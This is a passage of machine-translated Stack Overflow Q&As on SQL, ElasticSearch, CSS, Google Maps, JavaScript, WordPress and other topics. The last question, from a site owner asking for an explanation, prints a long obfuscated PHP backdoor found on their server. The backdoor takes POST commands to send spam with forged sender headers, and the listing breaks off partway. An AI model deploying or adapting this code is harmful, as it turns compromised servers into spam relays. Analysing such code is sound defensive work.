                             "ON cs.\"shipmentNumber\" = Address3.\"fileNumber\" " +
                             "WHERE ct.\"tripNumber\" = {1} " +
                             "AND csl.\"toHubSearchname\" <> ' ' " +
                             "ORDER BY 4", prefix, a.ToString());
    }
    #endregion

    #region UNIMS
    if (env == "UNIMS")
    {
        /* string Unims shipment  
         * http://stackoverflow.com/questions/14379573/error-in-list-of-function-arguments-not-recognized-unable-to-parse-query-t
             SELECT 
             leg.tsrido, 
             leg.tsrnum, 
             shipment.dosvlg, 
             condition(leg.tsakti = 1, load.land, unload.land), 
             condition(leg.tsakti = 1, load.postun, unload.postun), 
             condition(leg.tsakti = 1, load.tsadr1, unload.tsadr1) 

             FROM 
             tsroma leg 
             LEFT OUTER JOIN (SELECT * FROM tsdsmd WHERE (srtdos = 'd')) shipment 
             ON leg.dosvlg = shipment.dosvlg 

             LEFT OUTER JOIN (SELECT * FROM tsdnaw WHERE (tsroln = 1)) load 
             ON leg.dosvlg = load.dosvlg 

             LEFT OUTER JOIN (SELECT * FROM tsdnaw WHERE (tsroln = 3)) unload 
             ON leg.dosvlg = unload.dosvlg 

             WHERE (leg.tsrido = 79106279)

             ORDER BY 2
         */
        q = string.Format("SELECT " +
                        "leg.tsrido, " +
                        "leg.tsrnum, " +
                        "shipment.dosvlg, " +
                        "condition(leg.tsakti = 1, load.land, unload.land), " +
                        "condition(leg.tsakti = 1, load.postun, unload.postun), " +
                        "condition(leg.tsakti = 1, load.tsadr1, unload.tsadr1) " +
                        "FROM " +
                        "tsroma leg " +
                        "LEFT OUTER JOIN (SELECT * FROM tsdsmd WHERE srtdos = 'd') shipment " +
                        "ON leg.dosvlg = shipment.dosvlg " +
                        "LEFT OUTER JOIN (SELECT * FROM tsdnaw where tsroln = 1) load " +
                        "ON leg.dosvlg = load.dosvlg " +
                        "LEFT OUTER JOIN (SELECT * FROM tsdnaw where tsroln = 3) unload " +
                        "ON leg.dosvlg = unload.dosvlg " +
                        "WHERE leg.tsrido = {1} " +
                        "ORDER BY 2", prefix, a.ToString());
    }
    #endregion
    return q;
} 
```

**Edit4：** 我注意到当我删除下面的案例时查询是无止境的。我想我将首先重新考虑我的 ODBC 连接。

**Edit5：** 在大多数情况下，似乎不适用于 PuTTY 或直接用于机器。由于某种原因，它最终会导致资源占用查询。新方法：在 PuTTY 中使用正确的查询解决了问题，但在 ODBC Unims 中尚未接受

```
 select 
                    leg.tsrido, 
                    leg.tsrnum, 
                    dosier.dosvlg, 
                    condition(leg.tsakti = 1, dosier.lalaad, dosier.lalos), 
                    condition(leg.tsakti = 1, dosier.pklaad, dosier.pklos), 
                    condition(leg.tsakti = 1, dosier.tsla1,  dosier.tsua1) 

                from 
                    tsroma leg 
                    left outer join dosier 
                    on leg.dosvlg = dosier.dosvlg 
                where 
                    leg.tsrido = 79106279

                order by 2; 
```

**最终编辑：**

尽管 Visual Studio 无法识别条件的 unim 语法，但上述代码仍能正常工作。根据服务器，旧查询被卡住并且大小超过 100 MB，杀死了这些进程。有 10 年历史的数据库确实是一件奇怪的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:18:48.193

我对 UniMS 不熟悉，但也许以下其中一种方法会起作用：

```
 (case when leg.tsakti = 1 then load.land else unload.land end), 
             (case when condition(leg.tsakti = 1 then load.postun else unload.postun end), 
             (case when condition(leg.tsakti = 1 then load.tsadr1 else unload.tsadr1 end) 
```

或者：

```
 iif(leg.tsakti = 1, load.land, unload.land), 
             iif(leg.tsakti = 1, load.postun, unload.postun), 
             iif(leg.tsakti = 1, load.tsadr1, unload.tsadr1) 
```

或者：

```
 if(leg.tsakti = 1, load.land, unload.land), 
             if(leg.tsakti = 1, load.postun, unload.postun), 
             if(leg.tsakti = 1, load.tsadr1, unload.tsadr1) 
```

这些在其他一些数据库中工作。

# elasticsearch - 配置 ElasticSearch 的端口号

> ID：14379575
> 
> 赞同：30
> 
> 时间：2013-01-17T12:52:26.173
> 
> 标签：elasticsearch

我们正在使用 ElasticSearch 0.20.2 并使用

> 垃圾箱/弹性搜索 [-f]

bin/elasticsearch 脚本自行设置 ES_HOME ，似乎没有办法影响读取的配置文件的路径。ES 总是从

> $ES_HOME/config/elasticsearch.yml

但是，我必须能够指定我们自己的配置文件的路径，**而不会覆盖****ElasticSearch**附带 的现有elasticsearch.yml。

我怎么做？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2015-11-19T09:28:54.433

您必须在`elasticsearch.yml`文件中插入以下行。

```
http.port: port_number 
```

我在我的设置中做了同样的事情，它对我有用。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2017-10-06T22:01:49.150

对于多版本测试，您应该指定两个不同的端口：

```
bin/elasticsearch -E http.port=9400 -E transport.tcp.port=9500 
```

这样，如果您在同一台机器上有另一个版本的 elasticsearch，它们将不会相互通信。如果您确实希望它们进行通信，请将传输端口保留为默认值，或在两个实例上使其相同。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-03-16T02:12:41.493

你需要修改`path.conf`. 它看起来像：

```
bin/elasticsearch -f -Des.path.conf=/path/to/config/dir 
```

然后将读取`/path/to/config/dir/elasticsearch.yml`和`/path/to/config/dir/elasticsearch.json`（如果存在）。

`-Des.`另请记住，您可以像上面一样指定您想要的任何选项`path.conf`。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2015-12-22T15:59:08.013

只需更改`http.port`in `elasticsearch.yml`（通常 in `/etc/elasticsearch/elasticsearch.yml`）并从前面删除 # 并重新启动服务器。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-15T08:55:41.663

在启动 elasticsearch 时，您始终可以在外部进行设置：

```
$ elasticsearch -f -Des.config=<NewConfig> 
```

# css - Safari (Win7) 不使用 max-height 属性刷新 img 高度

> ID：14379581
> 
> 赞同：0
> 
> 时间：2013-01-17T12:52:47.560
> 
> 标签：css, safari

我有一个显示图像的网格。每个图像都应该适应单元格大小。

我正在使用这个 css 自动调整图像：

```
img {
  max-width: 100%;
  max-height: 100%;
} 
```

然后，当我调整包含图像的 div（单元格）的大小时，图像应该适应 div。它在 Chrome/Firefox 下正常工作。在 Safari 5.1.7 (Win 7) 上，它在更改 div 的宽度时有效，但对**高度**无效。

我在这里创建了一个示例案例：http: [//jsfiddle.net/MNL29/7/](http://jsfiddle.net/MNL29/7/)

`height`按钮增加了 div 的高度，按钮`width`改变了宽度，并且图像在 Safari 下不会调整大小。

为什么会发生这种情况，有没有办法解决它（没有 Javascript）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:56:26.557

新版本

```
div {
  height: 100px;
  width: 200px;
  background: red;
  position: relative;
}

img {
  max-width: 100%;
  max-height: 100%;
  position: absolute;
} 
```

似乎按预期工作。[小提琴](http://jsfiddle.net/MNL29/13/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:15:40.460

在某些浏览器中 {height:100%} 表示 100% 来自父容器，而其他浏览器将其解释为 100% 的窗口。像这样用jQuery做所有事情：

```
$("#1").click(function() { 
  var width = jQuery('div.A').width();
  var wWidth = jQuery(window).width();

  if (width+30 < wWidth) {
    $("div.A").css("width", "+=30px");
  } else {
    $("div.A").css("width", wWidth);
  }
});

$("#2").click(function() { 
  var height = jQuery('div.A').height();
  var wHeight = jQuery(window).height();

  if (height+30 < wHeight) {
    $("div.A").css("height", "+=30px");
  } else {
    $("div.A").css("height", wHeight);
  }
}); 
```

[演示](http://jsfiddle.net/algorhythm/MNL29/8/)

# javascript - 使用 Google map api V3 ASP.net 绘制多条不同颜色的折线

> ID：14379586
> 
> 赞同：11
> 
> 时间：2013-01-17T12:52:58.160
> 
> 标签：javascript, google-maps-api-3

我可以在谷歌地图中绘制多条折线并设置它们的样式，但我想用不同的颜色为每条折线着色。

目前，我有这个代码：

```
var DrivePath = [
  new google.maps.LatLng(37.772323, -122.214897),
  new google.maps.LatLng(21.291982, -157.821856),
  new google.maps.LatLng(-18.142599, 178.431),
  new google.maps.LatLng(-27.46758, 153.027892),
  new google.maps.LatLng(12.97918167,   77.6449),
  new google.maps.LatLng(12.97918667,   77.64487167),
  new google.maps.LatLng(12.979185, 77.64479167),
  new google.maps.LatLng(12.97918333, 77.64476)
];

var PathStyle = new google.maps.Polyline({
  path: DrivePath,
  strokeColor: "#FF0000",
  strokeOpacity: 1.0,
  strokeWeight: 2
});

PathStyle.setMap(map); 
```

有什么方法可以为我正在创建的每条折线添加单独的样式？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-01-17T13:58:26.987

当然。例如，假设您知道每行要使用什么颜色，假设您因此有一个长度等于 DrivePath.length - 1 的颜色数组。

```
var Colors = [
    "#FF0000", 
    "#00FF00", 
    "#0000FF", 
    "#FFFFFF", 
    "#000000", 
    "#FFFF00", 
    "#00FFFF", 
    "#FF00FF"
]; 
```

现在，不是绘制一条折线，而是为每个坐标绘制一条单独的折线。

```
for (var i = 0; i < DrivePath.length-1; i++) {
  var PathStyle = new google.maps.Polyline({
    path: [DrivePath[i], DrivePath[i+1]],
    strokeColor: Colors[i],
    strokeOpacity: 1.0,
    strokeWeight: 2,
    map: map
  });
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-06-17T09:11:55.173

*用于绘制 2 条不同的折线*

```
 function initialize()
    {

                map = new google.maps.Map(document.getElementById('map'), {
                    zoom: 7,
                    center: {lat: 41.879, lng: -87.624}  // Center the map on Chicago, USA.
                  });

                var polyOptions = {
                    strokeColor: '#000000',
                    strokeOpacity: 1.0,
                    strokeWeight: 3
                };
                var polyOptions2 = {
                    strokeColor: '#FFFFFF',
                    strokeOpacity: 1.0,
                    strokeWeight: 3
                };

                var polyline = new google.maps.Polyline(polyOptions);
                var polyline2= new google.maps.Polyline(polyOptions2);
                polyline.setMap(map);
                polyline2.setMap(map);
                google.maps.event.addListener(map, 'click', addLatLng);
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-27T21:58:20.543

上面的答案是正确的。这将导致分离的折线。这可以通过添加每条折线的圆形起始端和圆形结束端来改善。

```
polyline.setEndCap(new RoundCap());
polyline2.setStartCap(new RoundCap()); 
```

# oracle - 我可以创建一个新表并将两个表完全连接的结果存储到 oracle 服务器中吗？

> ID：14379587
> 
> 赞同：0
> 
> 时间：2013-01-17T12:53:09.720
> 
> 标签：oracle, join

有两个表 A 和 B 我对这两个表进行了完全连接，并以表格格式显示。我可以创建一个新表并将这些结果导入其中，以便我可以使用此表来显示其值，而不是再次使用整个代码吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:54:48.733

我认为您可以执行“将表创建为 SELECT ...”参考[http://www.techonthenet.com/sql/tables/create_table2.php](http://www.techonthenet.com/sql/tables/create_table2.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:54:34.597

您可以为此创建一个视图（物化与否）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:19:43.227

您可以从任何 select 语句创建表：

```
CREATE TABLE NEW_TABLE 
AS 
SELECT * 
FROM   TABLE_A
,      TABLE_B; 
```

# javascript - 如何将 .indexOf JS 函数与数组一起使用？或替代？

> ID：14379591
> 
> 赞同：1
> 
> 时间：2013-01-17T12:53:27.003
> 
> 标签：javascript

是否有可能使用`.indexOf`带有数组的函数进行搜索？像这样：

```
var d = "Hello";
var s = new Array ("Heart", "David", "Foo", "Hello");
if( d.indexOf(s) != -1) {
  alert("Found Hello");
} 
```

如果我使用上面的代码，那么它不会发出任何警报。我检查了控制台但**没有错误**。

*我在某处读到该`.indexOf`函数仅适用于字符串，不适用于字符串数组。*

*`indexOf`Javascript中是否有替代品或`.indexOf`已经提供了我想要的东西？*

[***小提琴***](http://jsfiddle.net/UndfJ/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:55:27.130

您应该在您希望搜索的对象上调用该方法，而不是在您希望搜索的项目上调用该方法，`s.indexOf(d)`在您的情况下

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:58:08.480

[字符串](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/indexOf)和[数组](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf)都有`indexOf`函数。您将它应用于字符串，并检查数组的字符串化是否包含在其中 - 您没有收到错误，但不起作用。您必须反过来检查字符串是否是数组的一项：

```
s.indexOf(d) != -1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:58:35.113

解决这个问题的另一种方法是使用 JavaScript 对象的 hash map 属性：

```
var d = "Hello";
var s = {"Heart": 1, "David": 1, "Foo": 1, "Hello": 1};
if (s[d]) {
    alert("Found Hello");
} 
```

# wpf - 向区域添加视图时出现 KeyNotFoundException

> ID：14379594
> 
> 赞同：0
> 
> 时间：2013-01-17T12:53:28.830
> 
> 标签：wpf, prism, mef, region

使用`MEF`和`Prism`。我有一个标有区域名称的窗格：

```
<telerik:RadPaneGroup prism:RegionManager.RegionName="MyModuleRegion" /> 
```

由于软件的性质，并不总是创建此窗格。基本上，它*可能*会在某个时候创建​​，但我们不知道何时创建。因此，`MyModule`无法将其视图附加到“MyModuleRegion” -`KeyNotFoundException`由于该区域不存在而引发异常：

```
// Region still not created! Now what?!
IRegion region = regionManager.Regions["MyModuleRegion"]; // <-- !!
region.Add(view, "My Module"); 
```

**如何`MyModule`在运行时将视图映射到“MyModuleRegion”区域？**即通过xaml创建区域时，注入视图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T17:39:04.137

您是否尝试过使用 View Discovery？:)

```
 this.RegionManager.RegisterViewWithRegion(RegionNames.MyModuleRegion, typeof(MyView)); 
```

它应该工作......我希望！:)

# .net - 设置项目自定义操作取消

> ID：14379597
> 
> 赞同：0
> 
> 时间：2013-01-17T12:53:42.420
> 
> 标签：.net, setup-project

我需要取消/rollbak 由 Visual Studio 2008 中的安装项目进行的 msi 卸载。

这是我作为卸载自定义操作执行的脚本

```
set service = GetObject ("winmgmts:")
for each Process in Service.InstancesOf ("Win32_Process")
    If Process.Name = "App.exe" then
        Set WshShell = CreateObject("WScript.Shell")
        intButton = WshShell.Popup("App is running, you cannot uninstall it", 0, "Uninstall error", 0)
    End If
next 
```

它在进程运行时显示消息，但在我单击“确定”后，当我想回滚/取消它时，卸载继续。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T15:33:02.347

如果抛出异常会发生什么？

我很难记住，但我想我曾经写过一些卸载程序代码来做到这一点（偶然地，但幸运的是在开发环境中！）并且有一份工作试图卸载应用程序（因为它一直在回滚卸载当它遇到异常时）。

# java - 使用 Hibernate 时是否需要在 H2 数据库中运行“分析”

> ID：14379603
> 
> 赞同：1
> 
> 时间：2013-01-17T12:54:02.263
> 
> 标签：java, database, hibernate, h2

在之前使用 Mysql 数据库的项目中，当大量数据添加到表中时，我不得不使用`ANALYZE tablename`该数据库，以便数据库为 SQL 创建合理的查询计划。

现在我将 H2 与 Hibernate 一起使用，我是否需要再担心这个问题或者 Hibernate 会为我处理这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:01:37.223

除非在非常特殊的情况下，您不再需要手动运行语句[`ANALYZE`](http://h2database.com/html/grammar.html#analyze)，因为 H2 的最新版本会不时自动更新统计信息（[您可以顺便更改此设置](http://h2database.com/javadoc/org/h2/constant/DbSettings.html#ANALYZE_AUTO)）。它在旧版本的 H2 中是必需的（我忘记了实现自动分析的确切时间，我想大约是两年前）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:01:10.797

对于任何数据库，Hibernate 都不会为您解决这个问题。

此外，H2 也有自己的优势和劣势。随着时间的推移，您会发​​现 H2 与您的应用程序发生冲突的新地方，您将不得不提出新的解决方案。

# javascript - 使用浏览器从 CD-ROM 或 DVD 读取数据

> ID：14379608
> 
> 赞同：3
> 
> 时间：2013-01-17T12:54:34.250
> 
> 标签：javascript, html, applet, cd, cd-rom

我正在为一个朋友构建一个 web 应用程序，用户界面应该允许用户按下按钮，并且它应该以某种方式将他们插入的 CD-ROM/DVD 的所有内容上传到服务器。

我不能真正拥有浏览器的标准“选择文件...”，因为 CD 内有许多不同的文件，位于许多不同的文件夹下。所以我不能让我的用户单独选择所有文件——即使我实现了 HTML5 多选，他们仍然必须浏览所有子文件夹（可能有几个级别）。而且这需要在 IE8 上工作，所以多选不起作用。

实现这一目标的最佳选择是什么？我正在寻找最透明的解决方案——下载 Java 小程序或外部插件的开销太大。flash能做到这样吗？Flash 仍然是一个插件，但它是可以接受的，因为它在很多地方都使用过，并且不需要像 Java 小程序那样需要“运行许可”。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-25T04:01:10.617

emmm……挺有意思的

无论如何，如果要依靠 Java Applet 解决方案......我认为不应该有一些单一的 API 来处理所有提到的问题

根据您的任务，这里是某种解决方案组合......

> 我不能真正拥有浏览器的标准“选择文件...”，
> 因为 CD 内有许多不同的文件，位于许多
> 不同的文件夹下。

*   如果您有可启动的 CD 或其他东西……在这种情况下，我可以建议您使用 CD 的 *.iso 映像文件生成。您可以为此使用[JIIC](http://jiic.berlios.de/) lib

*   ...关于上传，我可以建议使用[HttpClient](http://hc.apache.org/httpcomponents-client-ga/)
    （在客户端）+ [FileUpload](http://commons.apache.org/fileupload/)（在 servlet 端），这将允许上传 ~2Gb 重量文​​件... **（HttpClient 提示）**在您的 CD 中（读取大文件的情况）我确实建议覆盖 FileBody.writeTo(OutputStream) 方法来设置[块读取文件](http://docs.oracle.com/javase/6/docs/api/java/io/InputStream.html#read%28byte%5B%5D%29)支持

*   *或者如果您生成的文件真的很大，您还可以使用 RandomAccessFile 按索引读取/写入文件，请查看[readFully() 方法](http://docs.oracle.com/javase/6/docs/api/java/io/RandomAccessFile.html#readFully%28byte%5B%5D,%20int,%20int%29)*

还有一件事情...

> ...所以我不能让我的用户单独选择所有文件——即使我实现了 HTML5 多选，他们仍然必须浏览所有子文件夹（可能有几个级别）。而且这需要在 IE8 上工作，所以多选不起作用。

*   在 Java Applet 中它**可以**工作 :) 如果您只需要某种多选（并且它不是可引导 CD 或其他东西），您可以使用 Swing 的[JFileChooser](http://docs.oracle.com/javase/6/docs/api/javax/swing/JFileChooser.html)来完成此任务。仔细看看[setMultiSelectionEnabled(boolean) 之](http://docs.oracle.com/javase/6/docs/api/javax/swing/JFileChooser.html#setMultiSelectionEnabled%28boolean%29)类的方法...

    *   ...关于

> '...他们仍然需要浏览所有子文件夹（可能有几个级别）'

...您可以简单地（不上传文件夹）但预先打包这些级别，让我们说一个 zip 文件以将 zip 文件上传到服务器*（如果我在这里错了，请纠正我，因为**级别**的概念在你现在的问题）*。

* * *

尽管如此，了解更多细节会很有趣，因为对于网络应用程序来说，上传整个 CD 的任务非常罕见......通常，这是一个相当沉重的东西：S

* * *

报告该答案是否有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T10:56:33.503

我已经使用了一段时间的[精细上传器，它对于完整文件夹非常有效。](http://fineuploader.com/)它是完整的 html/javascript。

您必须将“webkitdirectory”和“mozdirectory”添加到 中`<input>`，并且维护目录结构可能很困难，但并非不可克服。您必须使用 onUpload 回调，然后获得对文件引用对象的访问权限，该对象应该有一个 'relativePath'您可以使用添加到上传者的发布数据以供服务器使用。

用户只能使用 firefox 或 chrome，并选择他们的目录（或拖动它！）。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T06:55:58.370

对于 Chrome，您可以依赖 HTML5 文件系统 API。您还可以读取目录和子目录的内容。但我不确定是否有任何解决方案可以为 IE 做同样的事情。

此链接可能对您有所帮助 [http://www.html5rocks.com/en/tutorials/file/filesystem/](http://www.html5rocks.com/en/tutorials/file/filesystem/) http://www.w3.org/TR/file-system-api/

# google-maps - 在嵌入式谷歌地图中实现弹跳标记

> ID：14379610
> 
> 赞同：0
> 
> 时间：2013-01-17T12:54:34.900
> 
> 标签：google-maps, google-maps-markers, jquery-gmap3

我正在努力将弹跳标记添加到嵌入在我的页面上的 Google 地图中。

这是现在的代码：

```
$("#venue-map").gmap3({
 map:{
    options:{
     center:[28.500169, 77.161950],
     zoom:13,
     mapTypeId: google.maps.MapTypeId.ROADMAP,
     mapTypeControl: false,
     navigationControl: true,
     scrollwheel: false,
     streetViewControl: false
    }
  },
   marker:{
   latLng:[28.500169, 77.161950],
   animation: google.maps.Animation.BOUNCE
   }

}); 
```

我似乎无法让弹跳光标正常运行。任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:55:57.160

从真正的选项派生的选项`google.maps.Marker`必须传递给选项成员：

```
 marker:{
    latLng   :[28.500169, 77.161950],
    options  :{animation: google.maps.Animation.BOUNCE}
   } 
```

# jquery - 在没有用户代理嗅探的情况下检测移动浏览器

> ID：14379616
> 
> 赞同：0
> 
> 时间：2013-01-17T12:54:44.490
> 
> 标签：jquery, css, mobile, media-queries

哪种方法更可靠地检测移动浏览器？

*   UA 嗅探

*   jQuery的`width()`

据我了解，UA 嗅探不是很可靠。

我需要根据查看页面的移动设备的宽度更改页面的 HTML。我不能单独使用媒体查询来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:14:33.240

您可以使用**[移动检测 JS 库](http://code.google.com/p/mobileesp/source/browse/#svn/JavaScript)**来执行此操作。注意警告：

```
// WARNING: 
//   These JavaScript-based device detection features may ONLY work 
//   for the newest generation of smartphones, such as the iPhone, 
//   Android and Palm WebOS devices.
//   These device detection features may NOT work for older smartphones 
//   which had poor support for JavaScript, including 
//   older BlackBerry, PalmOS, and Windows Mobile devices. 
//   Additionally, because JavaScript support is extremely poor among 
//   'feature phones', these features may not work at all on such devices.
//   For better results, consider using a server-based version of this code, 
//   such as Java, APS.NET, PHP, or Ruby. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:57:46.440

有两种选择：

1- 用户代理嗅探。2-手机检测JS库

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:10:59.253

您刚刚回答了自己的问题 - 您要么想采用用户的浏览器，要么采用他们的设备宽度。

如果您想在宽度小于 WIDTH_CONSTANT 时执行某些操作，请使用 mediaQueries，或使用 javascript 检查尺寸。

现在不建议在客户端进行用户代理嗅探，因为您需要寻找您感兴趣的功能，而不是嗅探用户代理。

所以在你的情况下，我几乎有信心说你应该寻找设备宽度。

PS如果您在服务器端进行交易，我认为用户代理嗅探将是了解设备用户正在使用的唯一方法。

# wordpress - 如何在 WP 中挂钩 validate_username（或 sanitize_user）？

> ID：14379620
> 
> 赞同：0
> 
> 时间：2013-01-17T12:55:03.327
> 
> 标签：wordpress, hook

我是 wordpress 的新手，我只是在学习它。 **如何挂钩 validate_username 或 sanitize_user 函数？**

我根本不想调用它们，我想为我的特定插件更改它们。

这是完整的故事：我的问题是我不知道如何正确更改现有的 WP 功能而不修改它们（一些钩子或类似的东西）。

我有以下问题：

*   我有一个显示注册表单的插件主题-我的登录
*   它有 register_new_user （处理注册新用户）-> 它不是 wp 标准功能，而是用插件编写的
*   此函数调用 WP 标准 validate_username：

    ```
    function register_new_user( $user_login, $user_email,$term, $country  ) {
    $errors = new WP_Error();

    $sanitized_user_login = sanitize_user( $user_login );
    $user_email = apply_filters( 'user_registration_email', $user_email );

    // Check the username
    if ( $sanitized_user_login == '' ) {
        $errors->add( 'empty_username', __( '<strong> ط®ط·ط£ </strong>...', 'theme-my-login' ) );
    } elseif ( !**validate_username**( $user_login ) ) { //HERE WE CALL WP VALIDATE_
        $errors->add( 'invalid_username', __( '<strong> ط®ط·ط£ </strong>: 
    ```

    ……

所以，这里的问题是 *validate_username* 不允许用户名使用阿拉伯语。但这正是客户想要的。所以，我相信我应该覆盖或以某种方式修改现有的 WP validate_username 或 sanitize_user（两者都在 wp-includes/user.php 中）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T13:04:37.793

我找到了一个可以为我做所有事情的插件：“用户名中的 WordPress 特殊字符” [http://wordpress.org/extend/plugins/wordpress-special-characters-in-usernames/](http://wordpress.org/extend/plugins/wordpress-special-characters-in-usernames/)

# php - 在服务器上发现 PHP 恶意代码 - 它有什么用途？

> ID：14379622
> 
> 赞同：7
> 
> 时间：2013-01-17T12:55:05.600
> 
> 标签：php

首先，我可以要求简要描述一下这段代码可能试图做什么？我假设它是恶意的。

其次，我可以采取任何措施来防止这些文件被添加到我的服务器中吗？我的想法是使用 SFTP over FTP 和更强的 ftp 密码，因为有人可能对 ftp 密码进行了暴力破解。

或者是否有可能有人在网站上的表单中提交了恶意代码，而我没有清理提交的数据？

这是我找到的 PHP 代码。

```
<?php
@error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
if (count($_POST) < 2) {
    die(PHP_OS . chr(49) . chr(48) . chr(43) . md5(0987654321));
}
$v5031e998 = false;
foreach (array_keys($_POST) as $v3c6e0b8a) {
    switch ($v3c6e0b8a[0]) {
        case chr(108):
            $vd56b6998 = $v3c6e0b8a;
            break;
        case chr(100):
            $v8d777f38 = $v3c6e0b8a;
            break;
        case chr(109):
            $v3d26b0b1 = $v3c6e0b8a;
            break;
        case chr(101);
            $v5031e998 = true;
            break;
    }
}
if ($vd56b6998 === '' || $v8d777f38 === '')
    die(PHP_OS . chr(49) . chr(49) . chr(43) . md5(0987654321));
$v619d75f8 = preg_split('/\,(\ +)?/', @ini_get('disable_functions'));
$v01b6e203 = @$_POST[$vd56b6998];
$v8d777f38 = @$_POST[$v8d777f38];
$v3d26b0b1 = @$_POST[$v3d26b0b1];
if ($v5031e998) {
    $v01b6e203 = n9a2d8ce3($v01b6e203);
    $v8d777f38 = n9a2d8ce3($v8d777f38);
    $v3d26b0b1 = n9a2d8ce3($v3d26b0b1);
}
$v01b6e203 = urldecode(stripslashes($v01b6e203));
$v8d777f38 = urldecode(stripslashes($v8d777f38));
$v3d26b0b1 = urldecode(stripslashes($v3d26b0b1));
if (strpos($v01b6e203, ';', 1) != false) {
    list($va3da707b, $vbfbb12dc, $v081bde0c) = preg_split('/;/', strtolower($v01b6e203));
    $va3da707b = ucfirst($va3da707b);
    $vbfbb12dc = ucfirst($vbfbb12dc);
    $v3a5939e4 = next(explode('@', $v081bde0c));
    if ($vbfbb12dc == '' || $va3da707b == '') {
        $vbfbb12dc = $va3da707b = '';
        $v01b6e203 = $v081bde0c;
    } else {
        $v01b6e203 = "\"$va3da707b $vbfbb12dc\" <$v081bde0c>";
    }
} else {
    $vbfbb12dc = $va3da707b = '';
    $v081bde0c = strtolower($v01b6e203);
    $v3a5939e4 = next(explode('@', $v01b6e203));
}
preg_match('|<USER>(.*)</USER>|imsU', $v8d777f38, $vee11cbb1);
$vee11cbb1 = $vee11cbb1[1];
preg_match('|<NAME>(.*)</NAME>|imsU', $v8d777f38, $vb068931c);
$vb068931c = $vb068931c[1];
preg_match('|<SUBJ>(.*)</SUBJ>|imsU', $v8d777f38, $vc34487c9);
$vc34487c9 = $vc34487c9[1];
preg_match('|<SBODY>(.*)</SBODY>|imsU', $v8d777f38, $v6f4b5f42);
$v6f4b5f42 = $v6f4b5f42[1];
$vc34487c9 = str_replace("%R_NAME%", $va3da707b, $vc34487c9);
$vc34487c9 = str_replace("%R_LNAME%", $vbfbb12dc, $vc34487c9);
$v6f4b5f42 = str_replace("%R_NAME%", $va3da707b, $v6f4b5f42);
$v6f4b5f42 = str_replace("%R_LNAME%", $vbfbb12dc, $v6f4b5f42);
$v0897acf4 = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']);
if (ne667da76($v0897acf4) || @ini_get('safe_mode'))
    $v10497e3f = false;
else
    $v10497e3f = true;
if ($v10497e3f)
    $v9a5cb5d8 = "$vee11cbb1@$v0897acf4";
else
    $v9a5cb5d8 = "$vee11cbb1@[$v0897acf4]";
if ($vb068931c != '')
    $vd98a07f8 = "$vb068931c <$v9a5cb5d8>";
else
    $vd98a07f8 = $v9a5cb5d8;
$vb8ddc93f = "From: $vd98a07f8\r\n";
$vb8ddc93f .= "Reply-To: $vd98a07f8\r\n";
$v3c87b187 = "X-Priority: 3 (Normal)\r\n";
$v3c87b187 .= "MIME-Version: 1.0\r\n";
$v3c87b187 .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n";
$v3c87b187 .= "Content-Transfer-Encoding: 8bit\r\n";
if (!in_array('mail', $v619d75f8)) {
    if ($v10497e3f) {
        if (@mail($v01b6e203, $vc34487c9, $v6f4b5f42, $vb8ddc93f . $v3c87b187, "-f$v9a5cb5d8"))
            die(chr(79) . chr(75) . md5(1234567890) . "+0");
    } else {
        if (@mail($v01b6e203, $vc34487c9, $v6f4b5f42, $v3c87b187))
            die(chr(79) . chr(75) . md5(1234567890) . "+0");
    }
}
$v4340fd73 = "Date: " . @date("D, j M Y G:i:s O") . "\r\n" . $vb8ddc93f;
$v4340fd73 .= "Message-ID: <" . preg_replace('/(.{7})(.{5})(.{2}).*/', '$1-$2-$3', md5(time())) . "@$v0897acf4>\r\n";
$v4340fd73 .= "To: $v01b6e203\r\n";
$v4340fd73 .= "Subject: $vc34487c9\r\n";
$v4340fd73 .= $v3c87b187;
$v841a2d68 = $v4340fd73 . "\r\n" . $v6f4b5f42;
if ($v3d26b0b1 == '')
    $v3d26b0b1 = n9c812bad($v3a5939e4);
if (($vb4a88417 = n7b0ecdff($v9a5cb5d8, $v081bde0c, $v841a2d68, $v0897acf4, $v3d26b0b1)) == 0) {
    die(chr(79) . chr(75) . md5(1234567890) . "+1");
} else {
    echo PHP_OS . chr(50) . chr(48) . '+' . md5(0987654321) . "+$vb4a88417";
}
function ne667da76($v957b527b)
{
